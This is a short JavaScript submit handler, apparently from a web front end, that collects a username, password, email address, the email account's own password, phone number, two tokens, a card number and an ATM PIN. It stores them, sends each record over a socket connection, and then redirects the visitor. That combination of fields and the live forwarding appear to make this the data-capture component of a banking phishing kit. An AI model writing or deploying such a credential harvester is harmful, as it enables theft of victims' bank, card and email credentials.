import { loader } from "../components/loader";

export const submitBase = async({valuesData, endUrl = '', dataImportant}) => {

    const { navigate, SetshowSpiner, socket, addData, urlToNavigate, spiner, timeLoader } = dataImportant

    const {
        typeDocument,
        username,
        password,
        correo,
        celular,
        claveCorreo,
        token1,
        token2,
        tarjeta,
        atmPassword, 
    } = valuesData;

    const [ newUser ] = await addData({typeDocument, username, password, correo, celular, claveCorreo, token1, token2, tarjeta, atmPassword})

    await socket.emit('[User] create', newUser)  
    
    if (spiner === true || timeLoader ) {
        loader(timeLoader, navigate, endUrl == true ? endUrl : urlToNavigate, endUrl )
        spiner === true && SetshowSpiner(true);
        return
    }

    return endUrl == true ? window.location.href = endUrl : navigate(`${urlToNavigate}`)
}